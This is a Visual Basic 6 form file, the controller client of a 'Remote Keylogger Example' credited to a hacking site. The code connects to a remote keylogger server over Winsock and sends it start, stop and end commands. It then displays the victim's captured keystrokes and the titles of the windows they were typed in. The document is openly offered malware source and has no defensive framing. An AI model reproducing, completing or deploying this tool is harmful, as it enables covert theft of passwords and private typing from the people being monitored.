VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00E0E0E0&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "[ Client ] -Leo-"
   ClientHeight    =   2760
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   8055
   BeginProperty Font 
      Name            =   "Small Fonts"
      Size            =   6.75
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   2760
   ScaleWidth      =   8055
   StartUpPosition =   3  'Windows Default
   Begin VB.Frame Frame4 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Status"
      ForeColor       =   &H80000008&
      Height          =   495
      Left            =   120
      TabIndex        =   14
      Top             =   2140
      Width           =   3015
      Begin VB.Label Stat 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Disconnected.."
         Enabled         =   0   'False
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   120
         TabIndex        =   15
         Top             =   200
         Width           =   2775
      End
   End
   Begin VB.Frame Frame3 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Keylogger"
      ForeColor       =   &H80000008&
      Height          =   975
      Left            =   120
      TabIndex        =   4
      Top             =   1160
      Width           =   3015
      Begin Client.OsenXPButton CmdEnd 
         Height          =   615
         Left            =   1560
         TabIndex        =   10
         Top             =   240
         Width           =   615
         _ExtentX        =   1085
         _ExtentY        =   1085
         BTYPE           =   3
         TX              =   "End"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Small Fonts"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   0   'False
         BCOL            =   12632256
         BCOLO           =   12632256
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   0
         MICON           =   "Form1.frx":0000
         PICN            =   "Form1.frx":001C
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   2
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.OsenXPButton CmdClear 
         Height          =   615
         Left            =   2280
         TabIndex        =   11
         Top             =   240
         Width           =   615
         _ExtentX        =   1085
         _ExtentY        =   1085
         BTYPE           =   3
         TX              =   "Clear"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Small Fonts"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   0   'False
         BCOL            =   12632256
         BCOLO           =   12632256
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   0
         MICON           =   "Form1.frx":05B6
         PICN            =   "Form1.frx":05D2
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   2
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.OsenXPButton CmdStop 
         Height          =   615
         Left            =   120
         TabIndex        =   12
         Top             =   240
         Width           =   615
         _ExtentX        =   1085
         _ExtentY        =   1085
         BTYPE           =   3
         TX              =   "Stop"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Small Fonts"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   0   'False
         BCOL            =   12632256
         BCOLO           =   12632256
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   0
         MICON           =   "Form1.frx":0B6C
         PICN            =   "Form1.frx":0B88
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   2
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.OsenXPButton CmdStart 
         Height          =   615
         Left            =   840
         TabIndex        =   13
         Top             =   240
         Width           =   615
         _ExtentX        =   1085
         _ExtentY        =   1085
         BTYPE           =   3
         TX              =   "Start"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Small Fonts"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   0   'False
         BCOL            =   12632256
         BCOLO           =   12632256
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   0
         MICON           =   "Form1.frx":0CE2
         PICN            =   "Form1.frx":0CFE
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   2
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
   End
   Begin VB.Frame Frame2 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Logged Keys"
      ForeColor       =   &H80000008&
      Height          =   2640
      Left            =   3240
      TabIndex        =   3
      Top             =   0
      Width           =   4695
      Begin VB.TextBox TxtKeyz 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         Height          =   2295
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   5
         Top             =   220
         Width           =   4455
      End
   End
   Begin VB.Frame Frame1 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "&Connecion"
      ForeColor       =   &H80000008&
      Height          =   1095
      Left            =   120
      TabIndex        =   0
      Top             =   40
      Width           =   3015
      Begin Client.OsenXPButton CmdC 
         Height          =   375
         Left            =   1560
         TabIndex        =   8
         Top             =   600
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Connect"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Small Fonts"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   0   'False
         BCOL            =   12632256
         BCOLO           =   12632256
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   0
         MICON           =   "Form1.frx":1298
         PICN            =   "Form1.frx":12B4
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.TextBox Text2 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         Enabled         =   0   'False
         Height          =   240
         Left            =   1680
         TabIndex        =   7
         Text            =   "Port : "
         Top             =   240
         Width           =   495
      End
      Begin VB.TextBox Text1 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         Enabled         =   0   'False
         Height          =   240
         Left            =   120
         TabIndex        =   6
         Text            =   "IP : "
         Top             =   240
         Width           =   375
      End
      Begin VB.TextBox TxtPort 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         Height          =   240
         Left            =   2160
         TabIndex        =   2
         Text            =   "7337"
         Top             =   240
         Width           =   735
      End
      Begin VB.TextBox TxtIP 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         Height          =   240
         Left            =   480
         TabIndex        =   1
         Text            =   "127.0.0.1"
         Top             =   240
         Width           =   1095
      End
      Begin Client.OsenXPButton CmdD 
         Height          =   375
         Left            =   120
         TabIndex        =   9
         Top             =   600
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Disconnect"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Small Fonts"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   0   'False
         BCOL            =   12632256
         BCOLO           =   12632256
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   0
         MICON           =   "Form1.frx":184E
         PICN            =   "Form1.frx":186A
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
   End
   Begin MSWinsockLib.Winsock Wsk 
      Left            =   2760
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' Remote Keylogger Example By Leo
' www.SilentHack.com
Public Connected As Boolean ' Were going to use this to establish whether or not were connected to the server

Private Sub CmdC_Click()
 If Connected = True Then 'Check if were already connected to the server.
  Stat.Caption = "Your already connected!"
   Else 'If were not already connected, we proceed to connect.
 Wsk.Close
  Wsk.Connect TxtIP, TxtPort
   Stat.Caption = "Connecting.."
    End If
End Sub

Private Sub CmdD_Click()
If Connected = False Then: Exit Sub
 Wsk.Close 'D/connect
  Stat.Caption = "Disconnected."
   Connected = False
End Sub

Private Sub CmdEnd_Click()
If Connected = True Then
 Wsk.SendData "End" 'Tell the server to stop keylogging
  Else
   Stat.Caption = "Your not connected yet!"
    End If
End Sub

Private Sub CmdStart_Click()
If Connected = True Then
 Wsk.SendData "Start" 'Tell the server to start keylogging
  Else
   Stat.Caption = "Your not connected yet!"
    End If
End Sub

Private Sub CmdStop_Click()
If Connected = True Then
 Wsk.SendData "Stop" 'Tell the server to stop keylogging
  Else
   Stat.Caption = "Your not connected yet!"
    End If
End Sub

Private Sub Form_Load()
 TxtIP = Wsk.LocalIP ' Put local IP in text box ( for testing )
End Sub

Private Sub CmdClear_Click()
 TxtKeyz = ""
End Sub

Private Sub Form_Unload(Cancel As Integer)
 End
End Sub

Private Sub TxtKeyz_Change()
 TxtKeyz.SelLength = Len(TxtKeyz) 'Auto scroll the text box.
End Sub

Private Sub Wsk_Close()
 Stat.Caption = "Disconnected.." ' The connections being closed
 Connected = False
End Sub

Private Sub Wsk_Connect()
 Stat.Caption = "Connected! - " & Wsk.RemoteHostIP ' Connection to the server has been established
 Connected = True
End Sub

Private Sub Wsk_DataArrival(ByVal bytesTotal As Long) 'This is where we sort the data that the server is sending back.
Dim Data                                     As String
 
Wsk.GetData Data, vbString 'Grab the data

If Left(Data, 5) = "ÀWINÀ" Then
Dim X, Y              As String
  X = Mid(Data, 6)
  Y = Len(X) - 1 ' This part is where we add the window caption to the logged keys text box. This little part here I put together *quickly* as a temp fix, the problem was the window caption would have the last pressed key on the end.. so... I had to have it trim that key of then add that key under the window title ( so we dont miss any data )
TxtKeyz = TxtKeyz & vbCrLf & vbCrLf & "[ " & Left(X, Y) & " ]" & vbCrLf & vbCrLf 'Add window caption.
TxtKeyz.Text = TxtKeyz.Text & Right(Data, 1) 'Move that key to the write place
Exit Sub

ElseIf Data = "ÀBRÀ" Then ' I added this in the server, this use means the enter key has been pressed server side. I made it weird "ÀBRÀ" so we dont get it confused with other data. This will now break a line on the text box on the client.
 TxtKeyz.Text = TxtKeyz.Text & vbCrLf 'Break the line
 Exit Sub 'Now exit the sub so we dont add any data we dont want

ElseIf Data = "ÀBSÀ" Then ' This is where the user typed a backspace, so we just trim a chartacter off the text
 Dim a
 a = Len(TxtKeyz) - 1
 TxtKeyz = Left(TxtKeyz, a)
 Exit Sub
 
ElseIf Left(Data, 8) = "ÀSTATUSÀ" Then ' If the first 8 characters are ÀSTATUSÀ then that means we can add the rest of the data to the client status, hence the word "STATUS"
 Stat.Caption = Mid(Data, 9)
 
 Else 'Anything else ( pressed keys ) we add to the text box

 TxtKeyz.Text = TxtKeyz.Text & Data

End If
End Sub

Private Sub Wsk_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
 Wsk.Close 'If theres an error , close the socket.
  Stat.Caption = "Error"
End Sub
